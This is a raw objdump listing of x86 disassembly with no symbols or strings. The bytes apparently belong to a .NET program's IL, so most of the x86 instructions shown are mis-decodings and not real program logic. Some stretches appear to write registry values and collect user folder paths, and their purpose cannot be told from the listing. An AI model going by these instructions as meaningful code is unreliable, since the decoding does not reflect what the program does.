  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	de 05 26 00 00 de    	fiadds 0xde000026
  4030c8:	00 2a                	add    %ch,(%edx)
  4030ca:	00 00                	add    %al,(%eax)
  4030cc:	01 10                	add    %edx,(%eax)
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	01 00                	add    %eax,(%eax)
  4030d4:	3f                   	aas
  4030d5:	40                   	inc    %eax
  4030d6:	00 05 12 00 00 01    	add    %al,0x1000012
  4030dc:	1b 30                	sbb    (%eax),%esi
  4030de:	04 00                	add    $0x0,%al
  4030e0:	85 00                	test   %eax,(%eax)
  4030e2:	00 00                	add    %al,(%eax)
  4030e4:	07                   	pop    %es
  4030e5:	00 00                	add    %al,(%eax)
  4030e7:	11 00                	adc    %eax,(%eax)
  4030e9:	00 72 a2             	add    %dh,-0x5e(%edx)
  4030ec:	0c 00                	or     $0x0,%al
  4030ee:	70 02                	jo     0x4030f2
  4030f0:	7b 0b                	jnp    0x4030fd
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	04 72                	add    $0x72,%al
  4030f6:	00 0d 00 70 28 3c    	add    %cl,0x3c287000
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	0a 0a                	or     (%edx),%cl
  403100:	28 4b 00             	sub    %cl,0x0(%ebx)
  403103:	00 0a                	add    %cl,(%edx)
  403105:	72 87                	jb     0x40308e
  403107:	0f 00                	(bad)
  403109:	70 28                	jo     0x403133
  40310b:	3f                   	aas
  40310c:	00 00                	add    %al,(%eax)
  40310e:	0a 06                	or     (%esi),%al
  403110:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  403114:	0a 00                	or     (%eax),%al
  403116:	02 28                	add    (%eax),%ch
  403118:	4b                   	dec    %ebx
  403119:	00 00                	add    %al,(%eax)
  40311b:	0a 72 87             	or     -0x79(%edx),%dh
  40311e:	0f 00                	(bad)
  403120:	70 28                	jo     0x40314a
  403122:	3f                   	aas
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 28                	or     (%eax),%ch
  403127:	33 00                	xor    (%eax),%eax
  403129:	00 06                	add    %al,(%esi)
  40312b:	00 02                	add    %al,(%edx)
  40312d:	72 99                	jb     0x4030c8
  40312f:	0f 00                	(bad)
  403131:	70 02                	jo     0x403135
  403133:	7b 0b                	jnp    0x403140
  403135:	00 00                	add    %al,(%eax)
  403137:	04 72                	add    $0x72,%al
  403139:	e9 0f 00 70 28       	jmp    0x28b0314d
  40313e:	3c 00                	cmp    $0x0,%al
  403140:	00 0a                	add    %cl,(%edx)
  403142:	28 32                	sub    %dh,(%edx)
  403144:	00 00                	add    %al,(%eax)
  403146:	06                   	push   %es
  403147:	00 02                	add    %al,(%edx)
  403149:	72 21                	jb     0x40316c
  40314b:	10 00                	adc    %al,(%eax)
  40314d:	70 02                	jo     0x403151
  40314f:	7b 0b                	jnp    0x40315c
  403151:	00 00                	add    %al,(%eax)
  403153:	04 72                	add    $0x72,%al
  403155:	7f 10                	jg     0x403167
  403157:	00 70 28             	add    %dh,0x28(%eax)
  40315a:	3c 00                	cmp    $0x0,%al
  40315c:	00 0a                	add    %cl,(%edx)
  40315e:	28 32                	sub    %dh,(%edx)
  403160:	00 00                	add    %al,(%eax)
  403162:	06                   	push   %es
  403163:	00 00                	add    %al,(%eax)
  403165:	de 05 26 00 00 de    	fiadds 0xde000026
  40316b:	00 2a                	add    %ch,(%edx)
  40316d:	00 00                	add    %al,(%eax)
  40316f:	00 01                	add    %al,(%ecx)
  403171:	10 00                	adc    %al,(%eax)
  403173:	00 00                	add    %al,(%eax)
  403175:	00 01                	add    %al,(%ecx)
  403177:	00 7e 7f             	add    %bh,0x7f(%esi)
  40317a:	00 05 12 00 00 01    	add    %al,0x1000012
  403180:	1b 30                	sbb    (%eax),%esi
  403182:	04 00                	add    $0x0,%al
  403184:	3f                   	aas
	...
  40318d:	00 02                	add    %al,(%edx)
  40318f:	72 b7                	jb     0x403148
  403191:	10 00                	adc    %al,(%eax)
  403193:	70 02                	jo     0x403197
  403195:	7b 0b                	jnp    0x4031a2
  403197:	00 00                	add    %al,(%eax)
  403199:	04 72                	add    $0x72,%al
  40319b:	fb                   	sti
  40319c:	10 00                	adc    %al,(%eax)
  40319e:	70 28                	jo     0x4031c8
  4031a0:	3c 00                	cmp    $0x0,%al
  4031a2:	00 0a                	add    %cl,(%edx)
  4031a4:	28 32                	sub    %dh,(%edx)
  4031a6:	00 00                	add    %al,(%eax)
  4031a8:	06                   	push   %es
  4031a9:	00 02                	add    %al,(%edx)
  4031ab:	72 17                	jb     0x4031c4
  4031ad:	11 00                	adc    %eax,(%eax)
  4031af:	70 28                	jo     0x4031d9
  4031b1:	32 00                	xor    (%eax),%al
  4031b3:	00 06                	add    %al,(%esi)
  4031b5:	00 02                	add    %al,(%edx)
  4031b7:	72 5d                	jb     0x403216
  4031b9:	11 00                	adc    %eax,(%eax)
  4031bb:	70 28                	jo     0x4031e5
  4031bd:	32 00                	xor    (%eax),%al
  4031bf:	00 06                	add    %al,(%esi)
  4031c1:	00 00                	add    %al,(%eax)
  4031c3:	de 05 26 00 00 de    	fiadds 0xde000026
  4031c9:	00 2a                	add    %ch,(%edx)
  4031cb:	00 01                	add    %al,(%ecx)
  4031cd:	10 00                	adc    %al,(%eax)
  4031cf:	00 00                	add    %al,(%eax)
  4031d1:	00 01                	add    %al,(%ecx)
  4031d3:	00 38                	add    %bh,(%eax)
  4031d5:	39 00                	cmp    %eax,(%eax)
  4031d7:	05 12 00 00 01       	add    $0x1000012,%eax
  4031dc:	1b 30                	sbb    (%eax),%esi
  4031de:	03 00                	add    (%eax),%eax
  4031e0:	21 00                	and    %eax,(%eax)
	...
  4031ea:	02 28                	add    (%eax),%ch
  4031ec:	4b                   	dec    %ebx
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a 72 00             	or     0x0(%edx),%dh
  4031f2:	12 00                	adc    (%eax),%al
  4031f4:	70 28                	jo     0x40321e
  4031f6:	3f                   	aas
  4031f7:	00 00                	add    %al,(%eax)
  4031f9:	0a 28                	or     (%eax),%ch
  4031fb:	33 00                	xor    (%eax),%eax
  4031fd:	00 06                	add    %al,(%esi)
  4031ff:	00 00                	add    %al,(%eax)
  403201:	de 05 26 00 00 de    	fiadds 0xde000026
  403207:	00 2a                	add    %ch,(%edx)
  403209:	00 00                	add    %al,(%eax)
  40320b:	00 01                	add    %al,(%ecx)
  40320d:	10 00                	adc    %al,(%eax)
  40320f:	00 00                	add    %al,(%eax)
  403211:	00 01                	add    %al,(%ecx)
  403213:	00 1a                	add    %bl,(%edx)
  403215:	1b 00                	sbb    (%eax),%eax
  403217:	05 12 00 00 01       	add    $0x1000012,%eax
  40321c:	1b 30                	sbb    (%eax),%esi
  40321e:	03 00                	add    (%eax),%eax
  403220:	85 00                	test   %eax,(%eax)
  403222:	00 00                	add    %al,(%eax)
  403224:	08 00                	or     %al,(%eax)
  403226:	00 11                	add    %dl,(%ecx)
  403228:	00 00                	add    %al,(%eax)
  40322a:	7e 39                	jle    0x403265
  40322c:	00 00                	add    %al,(%eax)
  40322e:	0a 72 10             	or     0x10(%edx),%dh
  403231:	12 00                	adc    (%eax),%al
  403233:	70 17                	jo     0x40324c
  403235:	6f                   	outsl  %ds:(%esi),(%dx)
  403236:	38 00                	cmp    %al,(%eax)
  403238:	00 0a                	add    %cl,(%edx)
  40323a:	0a 00                	or     (%eax),%al
  40323c:	06                   	push   %es
  40323d:	14 fe                	adc    $0xfe,%al
  40323f:	01 0b                	add    %ecx,(%ebx)
  403241:	07                   	pop    %es
  403242:	2c 10                	sub    $0x10,%al
  403244:	7e 39                	jle    0x40327f
  403246:	00 00                	add    %al,(%eax)
  403248:	0a 72 10             	or     0x10(%edx),%dh
  40324b:	12 00                	adc    (%eax),%al
  40324d:	70 6f                	jo     0x4032be
  40324f:	2b 00                	sub    (%eax),%eax
  403251:	00 0a                	add    %cl,(%edx)
  403253:	26 7e 39             	es jle 0x40328f
  403256:	00 00                	add    %al,(%eax)
  403258:	0a 72 86             	or     -0x7a(%edx),%dh
  40325b:	12 00                	adc    (%eax),%al
  40325d:	70 6f                	jo     0x4032ce
  40325f:	2b 00                	sub    (%eax),%eax
  403261:	00 0a                	add    %cl,(%edx)
  403263:	0c 00                	or     $0x0,%al
  403265:	08 72 00             	or     %dh,0x0(%edx)
  403268:	13 00                	adc    (%eax),%eax
  40326a:	70 02                	jo     0x40326e
  40326c:	7b 0b                	jnp    0x403279
  40326e:	00 00                	add    %al,(%eax)
  403270:	04 6f                	add    $0x6f,%al
  403272:	2c 00                	sub    $0x0,%al
  403274:	00 0a                	add    %cl,(%edx)
  403276:	00 08                	add    %cl,(%eax)
  403278:	72 0e                	jb     0x403288
  40327a:	13 00                	adc    (%eax),%eax
  40327c:	70 72                	jo     0x4032f0
  40327e:	e5 02                	in     $0x2,%eax
  403280:	00 70 6f             	add    %dh,0x6f(%eax)
  403283:	2c 00                	sub    $0x0,%al
  403285:	00 0a                	add    %cl,(%edx)
  403287:	00 00                	add    %al,(%eax)
  403289:	de 0b                	fimuls (%ebx)
  40328b:	08 2c 07             	or     %ch,(%edi,%eax,1)
  40328e:	08 6f 2d             	or     %ch,0x2d(%edi)
  403291:	00 00                	add    %al,(%eax)
  403293:	0a 00                	or     (%eax),%al
  403295:	dc 00                	faddl  (%eax)
  403297:	de 0b                	fimuls (%ebx)
  403299:	06                   	push   %es
  40329a:	2c 07                	sub    $0x7,%al
  40329c:	06                   	push   %es
  40329d:	6f                   	outsl  %ds:(%esi),(%dx)
  40329e:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4032a3:	dc 00                	faddl  (%eax)
  4032a5:	de 05 26 00 00 de    	fiadds 0xde000026
  4032ab:	00 2a                	add    %ch,(%edx)
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	00 01                	add    %al,(%ecx)
  4032b1:	28 00                	sub    %al,(%eax)
  4032b3:	00 02                	add    %al,(%edx)
  4032b5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4032b8:	27                   	daa
  4032b9:	63 00                	arpl   %eax,(%eax)
  4032bb:	0b 00                	or     (%eax),%eax
  4032bd:	00 00                	add    %al,(%eax)
  4032bf:	00 02                	add    %al,(%edx)
  4032c1:	00 13                	add    %dl,(%ebx)
  4032c3:	00 5e 71             	add    %bl,0x71(%esi)
  4032c6:	00 0b                	add    %cl,(%ebx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	00 00                	add    %al,(%eax)
  4032cc:	00 00                	add    %al,(%eax)
  4032ce:	01 00                	add    %eax,(%eax)
  4032d0:	7e 7f                	jle    0x403351
  4032d2:	00 05 12 00 00 01    	add    %al,0x1000012
  4032d8:	1b 30                	sbb    (%eax),%esi
  4032da:	03 00                	add    (%eax),%eax
  4032dc:	74 00                	je     0x4032de
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	08 00                	or     %al,(%eax)
  4032e2:	00 11                	add    %dl,(%ecx)
  4032e4:	00 00                	add    %al,(%eax)
  4032e6:	7e 39                	jle    0x403321
  4032e8:	00 00                	add    %al,(%eax)
  4032ea:	0a 72 24             	or     0x24(%edx),%dh
  4032ed:	13 00                	adc    (%eax),%eax
  4032ef:	70 17                	jo     0x403308
  4032f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f2:	38 00                	cmp    %al,(%eax)
  4032f4:	00 0a                	add    %cl,(%edx)
  4032f6:	0a 00                	or     (%eax),%al
  4032f8:	06                   	push   %es
  4032f9:	14 fe                	adc    $0xfe,%al
  4032fb:	01 0b                	add    %ecx,(%ebx)
  4032fd:	07                   	pop    %es
  4032fe:	2c 10                	sub    $0x10,%al
  403300:	7e 39                	jle    0x40333b
  403302:	00 00                	add    %al,(%eax)
  403304:	0a 72 24             	or     0x24(%edx),%dh
  403307:	13 00                	adc    (%eax),%eax
  403309:	70 6f                	jo     0x40337a
  40330b:	2b 00                	sub    (%eax),%eax
  40330d:	00 0a                	add    %cl,(%edx)
  40330f:	26 7e 39             	es jle 0x40334b
  403312:	00 00                	add    %al,(%eax)
  403314:	0a 72 cf             	or     -0x31(%edx),%dh
  403317:	13 00                	adc    (%eax),%eax
  403319:	70 6f                	jo     0x40338a
  40331b:	2b 00                	sub    (%eax),%eax
  40331d:	00 0a                	add    %cl,(%edx)
  40331f:	0c 00                	or     $0x0,%al
  403321:	08 72 00             	or     %dh,0x0(%edx)
  403324:	13 00                	adc    (%eax),%eax
  403326:	70 02                	jo     0x40332a
  403328:	7b 0b                	jnp    0x403335
  40332a:	00 00                	add    %al,(%eax)
  40332c:	04 6f                	add    $0x6f,%al
  40332e:	2c 00                	sub    $0x0,%al
  403330:	00 0a                	add    %cl,(%edx)
  403332:	00 00                	add    %al,(%eax)
  403334:	de 0b                	fimuls (%ebx)
  403336:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403339:	08 6f 2d             	or     %ch,0x2d(%edi)
  40333c:	00 00                	add    %al,(%eax)
  40333e:	0a 00                	or     (%eax),%al
  403340:	dc 00                	faddl  (%eax)
  403342:	de 0b                	fimuls (%ebx)
  403344:	06                   	push   %es
  403345:	2c 07                	sub    $0x7,%al
  403347:	06                   	push   %es
  403348:	6f                   	outsl  %ds:(%esi),(%dx)
  403349:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40334e:	dc 00                	faddl  (%eax)
  403350:	de 05 26 00 00 de    	fiadds 0xde000026
  403356:	00 2a                	add    %ch,(%edx)
  403358:	01 28                	add    %ebp,(%eax)
  40335a:	00 00                	add    %al,(%eax)
  40335c:	02 00                	add    (%eax),%al
  40335e:	3c 00                	cmp    $0x0,%al
  403360:	16                   	push   %ss
  403361:	52                   	push   %edx
  403362:	00 0b                	add    %cl,(%ebx)
  403364:	00 00                	add    %al,(%eax)
  403366:	00 00                	add    %al,(%eax)
  403368:	02 00                	add    (%eax),%al
  40336a:	13 00                	adc    (%eax),%eax
  40336c:	4d                   	dec    %ebp
  40336d:	60                   	pusha
  40336e:	00 0b                	add    %cl,(%ebx)
  403370:	00 00                	add    %al,(%eax)
  403372:	00 00                	add    %al,(%eax)
  403374:	00 00                	add    %al,(%eax)
  403376:	01 00                	add    %eax,(%eax)
  403378:	6d                   	insl   (%dx),%es:(%edi)
  403379:	6e                   	outsb  %ds:(%esi),(%dx)
  40337a:	00 05 12 00 00 01    	add    %al,0x1000012
  403380:	52                   	push   %edx
  403381:	00 02                	add    %al,(%edx)
  403383:	fe 06                	incb   (%esi)
  403385:	35 00 00 06 73       	xor    $0x73060000,%eax
  40338a:	4d                   	dec    %ebp
  40338b:	00 00                	add    %al,(%eax)
  40338d:	0a 28                	or     (%eax),%ch
  40338f:	4e                   	dec    %esi
  403390:	00 00                	add    %al,(%eax)
  403392:	0a 26                	or     (%esi),%ah
  403394:	2a 00                	sub    (%eax),%al
  403396:	00 00                	add    %al,(%eax)
  403398:	1b 30                	sbb    (%eax),%esi
  40339a:	04 00                	add    $0x0,%al
  40339c:	7a 00                	jp     0x40339e
  40339e:	00 00                	add    %al,(%eax)
  4033a0:	09 00                	or     %eax,(%eax)
  4033a2:	00 11                	add    %dl,(%ecx)
  4033a4:	00 00                	add    %al,(%eax)
  4033a6:	7e 39                	jle    0x4033e1
  4033a8:	00 00                	add    %al,(%eax)
  4033aa:	0a 72 7e             	or     0x7e(%edx),%dh
  4033ad:	14 00                	adc    $0x0,%al
  4033af:	70 17                	jo     0x4033c8
  4033b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4033b2:	38 00                	cmp    %al,(%eax)
  4033b4:	00 0a                	add    %cl,(%edx)
  4033b6:	0a 00                	or     (%eax),%al
  4033b8:	06                   	push   %es
  4033b9:	14 fe                	adc    $0xfe,%al
  4033bb:	03 0b                	add    (%ebx),%ecx
  4033bd:	07                   	pop    %es
  4033be:	2c 3b                	sub    $0x3b,%al
  4033c0:	00 06                	add    %al,(%esi)
  4033c2:	72 f2                	jb     0x4033b6
  4033c4:	14 00                	adc    $0x0,%al
  4033c6:	70 16                	jo     0x4033de
  4033c8:	8c 3b                	mov    %?,(%ebx)
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	01 1a                	add    %ebx,(%edx)
  4033ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4033cf:	40                   	inc    %eax
  4033d0:	00 00                	add    %al,(%eax)
  4033d2:	0a 00                	or     (%eax),%al
  4033d4:	06                   	push   %es
  4033d5:	72 06                	jb     0x4033dd
  4033d7:	15 00 70 16 8c       	adc    $0x8c167000,%eax
  4033dc:	3b 00                	cmp    (%eax),%eax
  4033de:	00 01                	add    %al,(%ecx)
  4033e0:	1a 6f 40             	sbb    0x40(%edi),%ch
  4033e3:	00 00                	add    %al,(%eax)
  4033e5:	0a 00                	or     (%eax),%al
  4033e7:	06                   	push   %es
  4033e8:	72 3c                	jb     0x403426
  4033ea:	15 00 70 16 8c       	adc    $0x8c167000,%eax
  4033ef:	3b 00                	cmp    (%eax),%eax
  4033f1:	00 01                	add    %al,(%ecx)
  4033f3:	1a 6f 40             	sbb    0x40(%edi),%ch
  4033f6:	00 00                	add    %al,(%eax)
  4033f8:	0a 00                	or     (%eax),%al
  4033fa:	00 00                	add    %al,(%eax)
  4033fc:	de 0b                	fimuls (%ebx)
  4033fe:	06                   	push   %es
  4033ff:	2c 07                	sub    $0x7,%al
  403401:	06                   	push   %es
  403402:	6f                   	outsl  %ds:(%esi),(%dx)
  403403:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403408:	dc 02                	faddl  (%edx)
  40340a:	72 68                	jb     0x403474
  40340c:	15 00 70 28 30       	adc    $0x30287000,%eax
  403411:	00 00                	add    %al,(%eax)
  403413:	06                   	push   %es
  403414:	00 00                	add    %al,(%eax)
  403416:	de 05 26 00 00 de    	fiadds 0xde000026
  40341c:	00 2a                	add    %ch,(%edx)
  40341e:	00 00                	add    %al,(%eax)
  403420:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403423:	00 02                	add    %al,(%edx)
  403425:	00 13                	add    %dl,(%ebx)
  403427:	00 47 5a             	add    %al,0x5a(%edi)
  40342a:	00 0b                	add    %cl,(%ebx)
  40342c:	00 00                	add    %al,(%eax)
  40342e:	00 00                	add    %al,(%eax)
  403430:	00 00                	add    %al,(%eax)
  403432:	01 00                	add    %eax,(%eax)
  403434:	73 74                	jae    0x4034aa
  403436:	00 05 12 00 00 01    	add    %al,0x1000012
  40343c:	1b 30                	sbb    (%eax),%esi
  40343e:	04 00                	add    $0x0,%al
  403440:	67 00 00             	add    %al,(%bx,%si)
  403443:	00 09                	add    %cl,(%ecx)
  403445:	00 00                	add    %al,(%eax)
  403447:	11 00                	adc    %eax,(%eax)
  403449:	00 7e 39             	add    %bh,0x39(%esi)
  40344c:	00 00                	add    %al,(%eax)
  40344e:	0a 72 88             	or     -0x78(%edx),%dh
  403451:	15 00 70 17 6f       	adc    $0x6f177000,%eax
  403456:	38 00                	cmp    %al,(%eax)
  403458:	00 0a                	add    %cl,(%edx)
  40345a:	0a 00                	or     (%eax),%al
  40345c:	06                   	push   %es
  40345d:	14 fe                	adc    $0xfe,%al
  40345f:	03 0b                	add    (%ebx),%ecx
  403461:	07                   	pop    %es
  403462:	2c 28                	sub    $0x28,%al
  403464:	00 06                	add    %al,(%esi)
  403466:	72 d2                	jb     0x40343a
  403468:	15 00 70 17 8c       	adc    $0x8c177000,%eax
  40346d:	3b 00                	cmp    (%eax),%eax
  40346f:	00 01                	add    %al,(%ecx)
  403471:	1a 6f 40             	sbb    0x40(%edi),%ch
  403474:	00 00                	add    %al,(%eax)
  403476:	0a 00                	or     (%eax),%al
  403478:	06                   	push   %es
  403479:	72 06                	jb     0x403481
  40347b:	16                   	push   %ss
  40347c:	00 70 16             	add    %dh,0x16(%eax)
  40347f:	8c 3b                	mov    %?,(%ebx)
  403481:	00 00                	add    %al,(%eax)
  403483:	01 1a                	add    %ebx,(%edx)
  403485:	6f                   	outsl  %ds:(%esi),(%dx)
  403486:	40                   	inc    %eax
  403487:	00 00                	add    %al,(%eax)
  403489:	0a 00                	or     (%eax),%al
  40348b:	00 00                	add    %al,(%eax)
  40348d:	de 0b                	fimuls (%ebx)
  40348f:	06                   	push   %es
  403490:	2c 07                	sub    $0x7,%al
  403492:	06                   	push   %es
  403493:	6f                   	outsl  %ds:(%esi),(%dx)
  403494:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403499:	dc 02                	faddl  (%edx)
  40349b:	72 2a                	jb     0x4034c7
  40349d:	16                   	push   %ss
  40349e:	00 70 28             	add    %dh,0x28(%eax)
  4034a1:	30 00                	xor    %al,(%eax)
  4034a3:	00 06                	add    %al,(%esi)
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	de 05 26 00 00 de    	fiadds 0xde000026
  4034ad:	00 2a                	add    %ch,(%edx)
  4034af:	00 01                	add    %al,(%ecx)
  4034b1:	1c 00                	sbb    $0x0,%al
  4034b3:	00 02                	add    %al,(%edx)
  4034b5:	00 13                	add    %dl,(%ebx)
  4034b7:	00 34 47             	add    %dh,(%edi,%eax,2)
  4034ba:	00 0b                	add    %cl,(%ebx)
  4034bc:	00 00                	add    %al,(%eax)
  4034be:	00 00                	add    %al,(%eax)
  4034c0:	00 00                	add    %al,(%eax)
  4034c2:	01 00                	add    %eax,(%eax)
  4034c4:	60                   	pusha
  4034c5:	61                   	popa
  4034c6:	00 05 12 00 00 01    	add    %al,0x1000012
  4034cc:	13 30                	adc    (%eax),%esi
  4034ce:	02 00                	add    (%eax),%al
  4034d0:	50                   	push   %eax
  4034d1:	00 00                	add    %al,(%eax)
  4034d3:	00 0a                	add    %cl,(%edx)
  4034d5:	00 00                	add    %al,(%eax)
  4034d7:	11 00                	adc    %eax,(%eax)
  4034d9:	17                   	pop    %ss
  4034da:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4034dd:	00 06                	add    %al,(%esi)
  4034df:	26 16                	es push %ss
  4034e1:	28 0d 00 00 06 26    	sub    %cl,0x26060000
  4034e7:	7e 11                	jle    0x4034fa
  4034e9:	00 00                	add    %al,(%eax)
  4034eb:	04 25                	add    $0x25,%al
  4034ed:	2d 17 26 7e 10       	sub    $0x107e2617,%eax
  4034f2:	00 00                	add    %al,(%eax)
  4034f4:	04 fe                	add    $0xfe,%al
  4034f6:	06                   	push   %es
  4034f7:	41                   	inc    %ecx
  4034f8:	00 00                	add    %al,(%eax)
  4034fa:	06                   	push   %es
  4034fb:	73 4f                	jae    0x40354c
  4034fd:	00 00                	add    %al,(%eax)
  4034ff:	0a 25 80 11 00 00    	or     0x1180,%ah
  403505:	04 73                	add    $0x73,%al
  403507:	50                   	push   %eax
  403508:	00 00                	add    %al,(%eax)
  40350a:	0a 0a                	or     (%edx),%cl
  40350c:	06                   	push   %es
  40350d:	17                   	pop    %ss
  40350e:	6f                   	outsl  %ds:(%esi),(%dx)
  40350f:	51                   	push   %ecx
  403510:	00 00                	add    %al,(%eax)
  403512:	0a 00                	or     (%eax),%al
  403514:	06                   	push   %es
  403515:	6f                   	outsl  %ds:(%esi),(%dx)
  403516:	52                   	push   %edx
  403517:	00 00                	add    %al,(%eax)
  403519:	0a 00                	or     (%eax),%al
  40351b:	02 72 4a             	add    0x4a(%edx),%dh
  40351e:	16                   	push   %ss
  40351f:	00 70 28             	add    %dh,0x28(%eax)
  403522:	30 00                	xor    %al,(%eax)
  403524:	00 06                	add    %al,(%esi)
  403526:	00 2a                	add    %ch,(%edx)
  403528:	1b 30                	sbb    (%eax),%esi
  40352a:	03 00                	add    (%eax),%eax
  40352c:	5e                   	pop    %esi
  40352d:	00 00                	add    %al,(%eax)
  40352f:	00 0b                	add    %cl,(%ebx)
  403531:	00 00                	add    %al,(%eax)
  403533:	11 00                	adc    %eax,(%eax)
  403535:	00 72 82             	add    %dh,-0x7e(%edx)
  403538:	16                   	push   %ss
  403539:	00 70 0a             	add    %dh,0xa(%eax)
  40353c:	28 4b 00             	sub    %cl,0x0(%ebx)
  40353f:	00 0a                	add    %cl,(%edx)
  403541:	72 a5                	jb     0x4034e8
  403543:	18 00                	sbb    %al,(%eax)
  403545:	70 28                	jo     0x40356f
  403547:	3f                   	aas
  403548:	00 00                	add    %al,(%eax)
  40354a:	0a 06                	or     (%esi),%al
  40354c:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  403550:	0a 00                	or     (%eax),%al
  403552:	02 28                	add    (%eax),%ch
  403554:	4b                   	dec    %ebx
  403555:	00 00                	add    %al,(%eax)
  403557:	0a 72 a5             	or     -0x5b(%edx),%dh
  40355a:	18 00                	sbb    %al,(%eax)
  40355c:	70 28                	jo     0x403586
  40355e:	3f                   	aas
  40355f:	00 00                	add    %al,(%eax)
  403561:	0a 28                	or     (%eax),%ch
  403563:	33 00                	xor    (%eax),%eax
  403565:	00 06                	add    %al,(%esi)
  403567:	00 02                	add    %al,(%edx)
  403569:	fe 06                	incb   (%esi)
  40356b:	36 00 00             	add    %al,%ss:(%eax)
  40356e:	06                   	push   %es
  40356f:	73 4f                	jae    0x4035c0
  403571:	00 00                	add    %al,(%eax)
  403573:	0a 73 50             	or     0x50(%ebx),%dh
  403576:	00 00                	add    %al,(%eax)
  403578:	0a 0b                	or     (%ebx),%cl
  40357a:	07                   	pop    %es
  40357b:	17                   	pop    %ss
  40357c:	6f                   	outsl  %ds:(%esi),(%dx)
  40357d:	51                   	push   %ecx
  40357e:	00 00                	add    %al,(%eax)
  403580:	0a 00                	or     (%eax),%al
  403582:	07                   	pop    %es
  403583:	6f                   	outsl  %ds:(%esi),(%dx)
  403584:	52                   	push   %edx
  403585:	00 00                	add    %al,(%eax)
  403587:	0a 00                	or     (%eax),%al
  403589:	00 de                	add    %bl,%dh
  40358b:	05 26 00 00 de       	add    $0xde000026,%eax
  403590:	00 2a                	add    %ch,(%edx)
  403592:	00 00                	add    %al,(%eax)
  403594:	01 10                	add    %edx,(%eax)
  403596:	00 00                	add    %al,(%eax)
  403598:	00 00                	add    %al,(%eax)
  40359a:	01 00                	add    %eax,(%eax)
  40359c:	57                   	push   %edi
  40359d:	58                   	pop    %eax
  40359e:	00 05 12 00 00 01    	add    %al,0x1000012
  4035a4:	1b 30                	sbb    (%eax),%esi
  4035a6:	04 00                	add    $0x0,%al
  4035a8:	bd 01 00 00 0c       	mov    $0xc000001,%ebp
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	11 00                	adc    %eax,(%eax)
  4035b1:	00 73 53             	add    %dh,0x53(%ebx)
  4035b4:	00 00                	add    %al,(%eax)
  4035b6:	0a 0a                	or     (%edx),%cl
  4035b8:	06                   	push   %es
  4035b9:	1f                   	pop    %ds
  4035ba:	24 28                	and    $0x28,%al
  4035bc:	41                   	inc    %ecx
  4035bd:	00 00                	add    %al,(%eax)
  4035bf:	0a 6f 54             	or     0x54(%edi),%ch
  4035c2:	00 00                	add    %al,(%eax)
  4035c4:	0a 00                	or     (%eax),%al
  4035c6:	06                   	push   %es
  4035c7:	1f                   	pop    %ds
  4035c8:	25 28 41 00 00       	and    $0x4128,%eax
  4035cd:	0a 6f 54             	or     0x54(%edi),%ch
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	0a 00                	or     (%eax),%al
  4035d4:	06                   	push   %es
  4035d5:	1f                   	pop    %ds
  4035d6:	26 28 41 00          	sub    %al,%es:0x0(%ecx)
  4035da:	00 0a                	add    %cl,(%edx)
  4035dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035dd:	54                   	push   %esp
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	0a 00                	or     (%eax),%al
  4035e2:	06                   	push   %es
  4035e3:	1f                   	pop    %ds
  4035e4:	2a 28                	sub    (%eax),%ch
  4035e6:	41                   	inc    %ecx
  4035e7:	00 00                	add    %al,(%eax)
  4035e9:	0a 6f 54             	or     0x54(%edi),%ch
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 00                	or     (%eax),%al
  4035f0:	06                   	push   %es
  4035f1:	1f                   	pop    %ds
  4035f2:	23 28                	and    (%eax),%ebp
  4035f4:	41                   	inc    %ecx
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	0a 6f 54             	or     0x54(%edi),%ch
  4035fa:	00 00                	add    %al,(%eax)
  4035fc:	0a 00                	or     (%eax),%al
  4035fe:	06                   	push   %es
  4035ff:	1f                   	pop    %ds
  403600:	1a 28                	sbb    (%eax),%ch
  403602:	41                   	inc    %ecx
  403603:	00 00                	add    %al,(%eax)
  403605:	0a 6f 54             	or     0x54(%edi),%ch
  403608:	00 00                	add    %al,(%eax)
  40360a:	0a 00                	or     (%eax),%al
  40360c:	06                   	push   %es
  40360d:	1f                   	pop    %ds
  40360e:	1c 28                	sbb    $0x28,%al
  403610:	41                   	inc    %ecx
  403611:	00 00                	add    %al,(%eax)
  403613:	0a 6f 54             	or     0x54(%edi),%ch
  403616:	00 00                	add    %al,(%eax)
  403618:	0a 00                	or     (%eax),%al
  40361a:	06                   	push   %es
  40361b:	28 4b 00             	sub    %cl,0x0(%ebx)
  40361e:	00 0a                	add    %cl,(%edx)
  403620:	6f                   	outsl  %ds:(%esi),(%dx)
  403621:	54                   	push   %esp
  403622:	00 00                	add    %al,(%eax)
  403624:	0a 00                	or     (%eax),%al
  403626:	06                   	push   %es
  403627:	16                   	push   %ss
  403628:	28 41 00             	sub    %al,0x0(%ecx)
  40362b:	00 0a                	add    %cl,(%edx)
  40362d:	6f                   	outsl  %ds:(%esi),(%dx)
  40362e:	54                   	push   %esp
  40362f:	00 00                	add    %al,(%eax)
  403631:	0a 00                	or     (%eax),%al
  403633:	06                   	push   %es
  403634:	1b 28                	sbb    (%eax),%ebp
  403636:	41                   	inc    %ecx
